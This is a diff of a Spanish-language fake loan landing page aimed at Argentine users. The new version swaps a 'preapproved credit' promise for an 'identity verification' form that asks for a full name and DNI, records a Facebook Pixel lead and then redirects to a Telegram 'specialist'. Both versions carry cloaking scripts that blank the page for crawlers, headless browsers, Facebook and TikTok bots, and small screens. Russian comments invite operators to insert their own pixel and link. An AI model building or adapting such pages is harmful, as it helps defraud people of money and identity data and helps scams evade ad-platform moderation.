@@ -2,61 +2,63 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Tu crédito fue preaprobado</title>
+  <title>Verificación de Identidad</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="robots" content="noindex, nofollow">
-  <style>
-    body {
-      background-color: #ffffff;
-      font-family: 'Segoe UI', sans-serif;
-      color: #222;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      text-align: center;
-      padding: 20px;
-    }
-    h1 {
-      color: #007f60;
-      font-size: 2rem;
-    }
-    .info {
-      font-size: 1.1rem;
-      margin: 8px 0;
-    }
-    .small {
-      font-size: 0.9rem;
-      color: #777;
-      margin-top: 20px;
-    }
-  </style>
+
+  <!-- Facebook Pixel -->
+  <script>
+    !function(f,b,e,v,n,t,s){
+      if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+      if(!f._fbq)f._fbq=n;
+      n.push=n;n.loaded=!0;n.version='2.0';
+      n.queue=[];t=b.createElement(e);t.async=!0;
+      t.src=v;s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s)
+    }(window, document,'script',
+      'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '739843071718618'); // ← твой пиксель
+  </script>
+
+  <!-- Лёгкая антибот-защита -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const isBot = () => {
+        const nav = navigator;
+        return (
+          nav.webdriver ||
+          /bot|crawl|spider|facebook|tiktok|headless/i.test(navigator.userAgent) ||
+          screen.width < 400
+        );
+      };
+
+      if (isBot()) {
+        document.body.innerHTML = ""; // блокируем доступ боту
+      }
+    });
+  </script>
 </head>
-<body>
-  <h1>✅ ¡Tu crédito fue preaprobado!</h1>
-  <p class="info">💰 Desde $200.000 ARS — Tasa desde el 11% anual</p>
-  <p class="info">⚡️ Proceso 100% online en menos de 5 minutos</p>
-  <p class="info">⏳ Redirigiendo al especialista...</p>
-  <p class="small">Si no ocurre nada, <a href="https://t.me/tu_usuario_telegram">haz clic aquí</a>.</p>
+
+<body style="font-family:sans-serif;text-align:center;padding:2em;">
+  <h1>Último paso para validar tu solicitud</h1>
+  <p>Completá los datos para conectarte con tu especialista.</p>
+
+  <form id="veriForm" style="max-width:400px;margin:auto;">
+    <input type="text" name="nombre" placeholder="Nombre completo" required style="width:100%;padding:10px;margin:10px;"><br>
+    <input type="text" name="dni" placeholder="DNI" required style="width:100%;padding:10px;margin:10px;"><br>
+    <button type="submit" style="padding:10px 20px;">Conectarme</button>
+  </form>
 
   <script>
-    const ua = navigator.userAgent;
+    document.getElementById("veriForm").addEventListener("submit", function(e) {
+      e.preventDefault();
 
-    // Только фильтрация самых агрессивных preview-ботов
-    const isBasicBot = /Telegram|WhatsApp|Discord|bot|preview/i.test(ua);
+      // Пиксель фиксирует лид
+      fbq('track', 'Lead');
 
-    if (!isBasicBot) {
-      setTimeout(() => {
-        window.location.href = "https://t.me/Veronica_especialista"; // ← вставь свою ссылку
-      }, 3000);
-    } else {
-      // Не редиректим, просто показываем заглушку
-      document.body.innerHTML = `
-        <h2>⚠️ Acceso limitado</h2>
-        <p>Por favor, accedé desde tu navegador.</p>
-      `;
-    }
+      // Переход в Telegram
+      window.location.href = "https://t.me/Veronica_especialista";
+    });
   </script>
 </body>
 </html>
